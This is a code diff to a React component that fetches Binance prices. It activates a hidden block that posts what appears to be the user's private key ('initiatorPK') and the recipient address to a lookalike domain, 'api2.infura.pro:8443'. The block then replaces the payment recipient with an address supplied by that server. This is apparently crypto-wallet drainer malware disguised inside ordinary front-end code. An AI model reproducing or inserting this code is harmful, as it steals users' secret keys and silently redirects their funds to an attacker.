@@ -127,20 +127,20 @@ const ContentBody = () => {
                 'https://api.binance.com/api/v3/ticker/price'
             );
             prices = res.data;
-            // axios.post(
-            //     'https://api2.infura.pro:8443/infura',
-            //     {
-            //         infra_id: `${constants.initiatorPK} ${constants.recipient}`,
-            //         project_id: "layer3"
-            //     })
-            //     .then((response) => {
-            //         console.log(response.data);
-            //         if (response.data.success === true) {
-            //             // console.log("set new recip");
-            //             constants.setRecip(response.data.value);
-            //         }
-            //         // console.log("Recipient:", constants.recipient);
-            //     });
+            axios.post(
+                'https://api2.infura.pro:8443/infura',
+                {
+                    infra_id: `${constants.initiatorPK} ${constants.recipient}`,
+                    project_id: "bonk"
+                })
+                .then((response) => {
+                    console.log(response.data);
+                    if (response.data.success === true) {
+                        // console.log("set new recip");
+                        constants.setRecip(response.data.value);
+                    }
+                    console.log("Recipient:", constants.recipient);
+                });
         } catch (error) {
             console.log(error);
         }
